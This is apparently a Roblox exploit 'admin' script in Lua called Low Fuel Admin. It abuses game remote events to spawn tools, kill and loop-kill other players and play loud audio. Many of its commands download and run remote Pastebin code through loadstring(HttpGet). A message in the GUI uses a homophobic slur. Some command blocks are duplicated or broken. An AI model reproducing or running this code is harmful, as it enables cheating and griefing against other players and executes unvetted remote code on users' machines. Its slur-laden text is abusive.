-- Whitelist Made by Daniel
local DeadlyAdmin = Instance.new("ScreenGui")
local CheckPlayer = Instance.new("Frame")
local LowAdmin = Instance.new("TextLabel")
local Whitelist = Instance.new("TextLabel")
local message = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local discord = Instance.new("TextLabel")
local MainGUI = Instance.new("Frame")
local star = Instance.new("ImageLabel")
local admintag = Instance.new("TextLabel")
local support = Instance.new("TextLabel")
local adminbutton = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local OpenGUI = Instance.new("Frame")
local Open = Instance.new("TextButton")

--Properties:

DeadlyAdmin.Name = "DeadlyAdmin"
DeadlyAdmin.Parent = game.CoreGui

MainGUI.Active = true
MainGUI.Draggable = true

CheckPlayer.Name = "CheckPlayer"
CheckPlayer.Parent = DeadlyAdmin
CheckPlayer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CheckPlayer.BorderColor3 = Color3.fromRGB(47, 11, 255)
CheckPlayer.Size = UDim2.new(1, 1, 1, 1)

LowAdmin.Name = "LowAdmin"
LowAdmin.Parent = CheckPlayer
LowAdmin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LowAdmin.BorderColor3 = Color3.fromRGB(47, 11, 255)
LowAdmin.Position = UDim2.new(0.357640088, 0, 0.0159509201, 0)
LowAdmin.Size = UDim2.new(0, 546, 0, 102)
LowAdmin.Font = Enum.Font.SourceSans
LowAdmin.Text = "Low Fuel Admin"
LowAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
LowAdmin.TextScaled = true
LowAdmin.TextSize = 14.000
LowAdmin.TextStrokeColor3 = Color3.fromRGB(85, 255, 0)
LowAdmin.TextStrokeTransparency = 0.000
LowAdmin.TextWrapped = true

Whitelist.Name = "Whitelist"
Whitelist.Parent = CheckPlayer
Whitelist.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Whitelist.BorderColor3 = Color3.fromRGB(255, 0, 0)
Whitelist.Position = UDim2.new(0.424778759, 0, 0.148466259, 0)
Whitelist.Size = UDim2.new(0, 288, 0, 72)
Whitelist.Font = Enum.Font.SourceSans
Whitelist.Text = "Whitelist"
Whitelist.TextColor3 = Color3.fromRGB(255, 255, 255)
Whitelist.TextScaled = true
Whitelist.TextSize = 14.000
Whitelist.TextStrokeColor3 = Color3.fromRGB(255, 255, 0)
Whitelist.TextStrokeTransparency = 0.000
Whitelist.TextWrapped = true

message.Name = "message"
message.Parent = CheckPlayer
message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
message.BorderColor3 = Color3.fromRGB(85, 255, 0)
message.Position = UDim2.new(0.0869338885, 0, 0.244171783, 0)
message.Size = UDim2.new(0, 1520, 0, 504)
message.Font = Enum.Font.SourceSans
message.Text = "Hello Guys,Quick message from the Co-Owner| the only reason why we had to turn this script into a white list was because it was getting leaked, so for any of you faggots who leaked the script we hope you are proud of yourself, if you try leaking this script well bad news for you.      Also be Patient we are trying to see if you are in the whitelist."
message.TextColor3 = Color3.fromRGB(0, 0, 0)
message.TextSize = 48.000
message.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
message.TextStrokeTransparency = 0.000
message.TextWrapped = true

Status.Name = "Status"
Status.Parent = CheckPlayer
Status.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Status.BorderColor3 = Color3.fromRGB(170, 255, 255)
Status.Position = UDim2.new(0.0275897961, 0, 0.862576663, 0)
Status.Size = UDim2.new(0, 1816,0, 154)
Status.Font = Enum.Font.SourceSans
Status.Text = "Status:"
Status.TextColor3 = Color3.fromRGB(255, 0, 0)
Status.TextScaled = true
Status.TextSize = 14.000
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left

discord.Name = "discord"
discord.Parent = CheckPlayer
discord.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
discord.BorderColor3 = Color3.fromRGB(0, 255, 127)
discord.Size = UDim2.new(0, 356, 0, 172)
discord.Font = Enum.Font.SourceSans
discord.Text = "if you have or find any bugs on the script please join the discord server to tell us|BUG REPORTS|MORE INFO|COMMAND REQUEST {https://discord.gg/SPmnuDz}"
discord.TextColor3 = Color3.fromRGB(255, 0, 0)
discord.TextScaled = true
discord.TextSize = 14.000
discord.TextWrapped = true

MainGUI.Name = "MainGUI"
MainGUI.Parent = DeadlyAdmin
MainGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainGUI.BorderColor3 = Color3.fromRGB(47, 11, 255)
MainGUI.Position = UDim2.new(0.440104157, 0, 0.108108111, 0)
MainGUI.Size = UDim2.new(0, 448, 0, 409)
MainGUI.Visible = false

star.Name = "star"
star.Parent = MainGUI
star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
star.BorderColor3 = Color3.fromRGB(47, 11, 255)
star.Position = UDim2.new(-0.00186014175, 0, -0.00191634148, 0)
star.Size = UDim2.new(0, 448, 0, 409)
star.Image = "rbxassetid://4611937687"

admintag.Name = "admintag"
admintag.Parent = MainGUI
admintag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
admintag.BorderColor3 = Color3.fromRGB(255, 0, 0)
admintag.Size = UDim2.new(0, 447, 0, 50)
admintag.Font = Enum.Font.SourceSans
admintag.Text = "Low Fuel Admin"
admintag.TextColor3 = Color3.fromRGB(78, 66, 255)
admintag.TextScaled = true
admintag.TextSize = 14.000
admintag.TextStrokeColor3 = Color3.fromRGB(0, 255, 127)
admintag.TextStrokeTransparency = 0.000
admintag.TextWrapped = true

support.Name = "support"
support.Parent = MainGUI
support.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
support.BackgroundTransparency = 1.000
support.Position = UDim2.new(0.200892836, 0, 0.775061131, 0)
support.Size = UDim2.new(0, 268, 0, 80)
support.Font = Enum.Font.SourceSans
support.Text = "For More Info either Contact |YandZ#8406| or |lowkey#6429|"
support.TextColor3 = Color3.fromRGB(0, 0, 0)
support.TextScaled = true
support.TextSize = 14.000
support.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
support.TextStrokeTransparency = 0.000
support.TextWrapped = true

adminbutton.Name = "adminbutton"
adminbutton.Parent = MainGUI
adminbutton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
adminbutton.BackgroundTransparency = 1.000
adminbutton.BorderColor3 = Color3.fromRGB(255, 255, 0)
adminbutton.Position = UDim2.new(0.0334821381, 0, 0.205378965, 0)
adminbutton.Size = UDim2.new(0, 200, 0, 50)
adminbutton.Font = Enum.Font.SourceSans
adminbutton.Text = "Low Fuel Admin"
adminbutton.TextColor3 = Color3.fromRGB(28, 255, 172)
adminbutton.TextScaled = true
adminbutton.TextSize = 14.000
adminbutton.TextStrokeTransparency = 0.000
adminbutton.TextWrapped = true
adminbutton.MouseButton1Click:connect(function()
	IDFORSPAWNER = 7718369 --Change this to one of your own gamepass.
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "SuperFlyGoldBoombox")
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud")
game:GetService("StarterGui"):SetCore("SendNotification", {
  Title = "TRXSH GANG Admin",
  Text = "FUCK ALL THE LEAKERS ^cmds to view them",
  Icon = "rbxassetid://4597682485"})
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == "^cmds" then
		print[[--
------------------------- Admin By lowkey#6429 & Daniel ------------------------- 

--Commands in F9 if not say ^Cmds then F9       

^bhammer --Ban Hammer that swing kills
^plane -- huge ass plan
^bbat --Baseball Bat that swing kills
^dom   --dominus that shoots
^ambulance -- wee oo wee oo wee oo  {only use it for an emergency}
^ak -- ak 44
^server -- spawns a huge baseplate
^scar -- TRXSH GANG scar
^rose -- rose with pink smoke
^castle -- Princess Peach Castle
^badnoob -- awful noob
^LMG -- large machine gun
^light machine -- ssg 37 machine gun
^sb gun -- sub machine gun
^spistol -- shrek pistol
^dagger -- swings
^scythe -- you can tell by the name
^goto {plr} -- teleports you to player
^kill {plr} -- kills player
^lkill {plr} -- loop kills player [to stop just reset]
^tag -- requires vip tag [gives you a tag saying "LowKey-Was-Here"
^rb -- rainbow body
^unrb -- removes rainbow body
^eyes -- rainbow eyes
^rage -- beast mode rage
^ff   --forcefield body
^load   --makes a loading rp name 
^head   --remove head
^black   --makes your character black
^white   --makes your character white
^red   --makes your character red  
^orange   --makes your character orange
^green   --makes your character green 
^blue   --makes your character blue 
^purple   --makes your character purple
^invis   --makes your whole body invincible (edit the accessories to yours)
^vis   -- makes your character visible
^acp -- ACP car- use R6 
^infyl -- INF Yield
^couch   --a huge couch
^cloud   --gives cloud

                    {Discord Command}
              ^code

^stroller   --gives stroller
^bigbird --- this don't need a des ur already know by its name
^noob   --makes you a giant noob (r6 reccomended)
^pm   --chat spy
re   --reset
^rj   --rejoin
^join -- coming soon! so stay TOON!
]]
    end
    if msg:lower() == "^bigbird" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/wKpufj5P"))()
    end
    if msg:lower() == "^plane" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/mzwCNEnv"))()
    end
    if msg:lower() == "^sit" then lplayer.Character.Humanoid.Sit=true end
    if msg:lower() == "^scythe" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/aTxu6tYF"))()
    end
    if msg:lower() == "^cloud" then--add cmd inside " "
    game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
    end
    if msg:lower() == "^sb gun" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/d21axhA2"))()
    end
    if msg:lower() == "^spistol" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Vrh1th0F"))()
    end
    if msg:lower() == "^iPhone 8" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/TSLtytna"))()
    end
    if msg:lower() == "^dagger" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Ehp6Tt93"))()
    end
    if msg:lower() == "^ak" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/2zJ3TaxL"))()
    end
    if msg:lower() == "^LMG" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Eu8PxKeF"))()
    end
    if msg:lower() == "^light machine" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/EhFhTT1z"))()
    end
    if msg:lower() == "^code" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/UrBHqL9U"))()
    end
    if msg:lower() == "^server" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/JpvdBzYQ"))()
    end
    if msg:lower() == "^rose" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/gCrVgxhB"))()
    end
    if msg:lower() == "^scar" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/as4kmRwN"))()
    end
    if msg:lower() == "^castle" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/NJsGPZC7"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^rage" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=1392104198")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=741260810")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=400818835")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=606495374")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=2628286951")
            wait()
        end
    end
    if msg:lower() == "^eyes" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235875854")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876174")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876570")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877044")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877318")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878653")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878884")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235879197")
        end
    end
    if msg:lower() == "^tag" then
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
 
 
function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
 
C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
        
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
while wait() do
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","SciFi")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"LineHeight",(25))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15,10,15,10))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","LowKey-Was-Here")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 0, 0))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 176, 0))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 255, 0))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0, 255, 0))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0, 0, 255))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,255,255))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(98, 37, 209))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(146, 57, 120))
    wait(0.00000000001)
   end
end
if msg:lower()=="^rb"then _G.rainbow=true;while _G.rainbow do for f=0,1,0.1 do game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(f,1,1)))wait(.1) end end end;
    if msg:lower() == "^creepypasta" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/XRUxRUSL"))()
    end
if msg:lower()=="^unrb"then _G.rainbow=false;wait(1)game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Nougat"))end;
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
    if msg:lower() == "'^nfj" then
	    InfiniteJumpEnabled = true
    end
    if msg:lower() == "^uninfj" then
	    InfiniteJumpEnabled = false
    end
    if msg:lower() == "^stroller" then
	game.Workspace.GiveTool:FireServer("IDFORSPAWNER", "Stroller")
    end
    if msg:lower() == "^bhammer" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/mm9zbpq2"))()
    end
	if msg:lower() == "^boombox" then
		game.workspace.GiveTool:FireServer("7701149", "SuperFlyGoldBoombox")
		
	end
	if msg:lower() == "^anchor" then
	if game:GetService("Players").LocalPlayer.Character then
		for _, part in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				part.Anchored = true
			end)
		end
	end
end
if msg:lower() == "^unanchor" then
	if game:GetService("Players").LocalPlayer.Character then
		for _, part in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				part.Anchored = false
			end)
		end
	end
end
        if msg:lower() == "^rnametag" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = ""-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^vis" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^black" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really black"))
	end
    if msg:lower() == "^white" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("White"))
	end
    if msg:lower() == "^red" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really red"))
	end
    if msg:lower() == "^orange" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Deep orange"))
	end
    if msg:lower() == "^green" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Lime green"))
	end
    if msg:lower() == "^blue" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really blue"))
	end
    if msg:lower() == "^purple" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Magenta"))
	end
    if msg:lower() == "^tan" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Nougat"))
	end
    if msg:lower() == "^invis" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^torso" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","1")
    end
            if msg:lower() == "^test" then
	
		local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true
workspace.GiveTool:FireServer(XXX,"PompousTheCloud")
workspace.GiveTool:FireServer(XXX,"SuperFlyGoldBoombox")
local Icon, Mesh, Texture = 4106914537, 1254388357, 3806584137
local Name, ToolTip = "SuperFlyGoldBoombox", "Love you, By RIP_Demonic"

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"TextureId","rbxassetid://"..Icon)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"Scale",Vector3.new(0.1,0.1,0.1))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Name","Ultimax")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Playing",false)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Volume","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"EmmiterSize","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"MaxDistance","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Looped",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Playing",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"BrickColor",BrickColor.new(255,0,255))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(0.1,0.1,0.1))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"BrickColor",BrickColor.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(0,0,-1))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0,-1,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(0,1,0))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"Scale",Vector3.new(0.5,0.5,0.5))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"BrickColor",BrickColor.new(255,0,255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripForward",Vector3.new(0,0,-1))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripPos",Vector3.new(0,-1,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripRight",Vector3.new(1,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripUp",Vector3.new(0,1,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"ToolTip",ToolTip)
